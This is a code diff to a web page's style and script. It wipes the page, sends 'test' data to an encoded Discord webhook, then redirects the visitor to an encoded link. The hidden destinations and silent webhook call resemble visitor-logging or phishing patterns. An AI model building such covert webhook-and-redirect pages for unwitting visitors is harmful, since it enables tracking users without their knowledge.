@@ -7,6 +7,12 @@
     <style>
         body {
             background-color: white; /* Default background color for the form page */
+            margin: 0; /* Remove default margins */
+            height: 100vh; /* Full height to ensure white background fills the screen */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
         }
     </style>
 </head>
@@ -73,6 +79,12 @@
                     console.log("Decoded Webhook:", webhook);
                     console.log("Decoded Link:", link);
 
+                    // Clear all HTML elements from the page
+                    document.body.innerHTML = '';
+
+                    // Change the page background to white
+                    document.body.style.backgroundColor = "white";
+
                     // Send 'test' data to the Discord webhook via a POST request
                     fetch(webhook, {
                         method: 'POST',
@@ -93,8 +105,6 @@
                         console.error('Error sending webhook:', error);
                     })
                     .finally(() => {
-                        // Change the page background to white during redirection
-                        document.body.style.backgroundColor = "white";
                         // Redirect to the decoded link
                         setTimeout(() => {
                             window.location.href = link;
